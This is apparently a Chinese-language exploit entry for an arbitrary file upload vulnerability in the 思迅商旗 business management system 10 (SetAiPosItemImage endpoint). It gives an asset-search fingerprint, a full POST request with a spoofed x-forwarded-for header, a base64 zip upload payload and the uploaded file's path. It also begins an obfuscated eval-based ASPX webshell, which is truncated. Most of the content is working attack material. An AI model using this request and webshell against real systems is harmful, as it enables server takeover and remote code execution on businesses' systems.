# 思迅商旗商业管理系统10SetAiPosItemImage存在任意文件上传漏洞

- **系统**：思迅商旗商业管理系统10SetAiPosItemImage　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name=="思迅商旗"`
- **请求**：`POST /api/POS/SetAiPosItemImage HTTP/1.1`
- **关键头**：`Content-Length: 416`　`Content-Type: application/json`　`x-forwarded-for: 127.0.0.1`

**请求体 / payload**
```
{"Body":{"pos_id":"test","file_data":"UEsDBBQAAAAIAJmoeFdm5m19YgAAAGQAAAATAAAAaW5pdC1jNTIyMjg1MzVhLmNzcwXBQQqEMAwAwLvgH3rcPXRJaV3Qk19JkxQLGsUqKuLfnekn4Yym0CqiBpXNZ8LTHpm3oXM+wHJ+77r6qRzF0rzrZpOTBjhBixJT5Cb9OXhHPgZwBBRvzmUZ8ep0Vnnq6nkBUEsBAj8AFAAAAAgAmah4V2bmbX1iAAAAZAAAABMAJAAAAAAAAAAgAAAAAAAAAGluaXQtYzUyMjI4NTM1YS5jc3MKACAAAAAAAAEAGADoFpjO1h7aAQAAAAAAAAAAAAAAAAAAAABQSwUGAAAAAAEAAQBlAAAAkwAAAAAA","last_time":""}}

上传文件位置
/AiItemImage/init-c52228535a.css

漏洞利用\
准备webshell`stc.aspx`
<% function E873yr9k(){var GEPH="unsa",YACK="fe",C910=GEPH+YACK;return C910;}var PAY:String=Request["x"];~eval/*…（脚本共 1553 字，完整版见原文）
```

**其他**
- 思迅商旗商业管理系统10 SetAiPosItemImage存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 思迅商旗商业管理系统10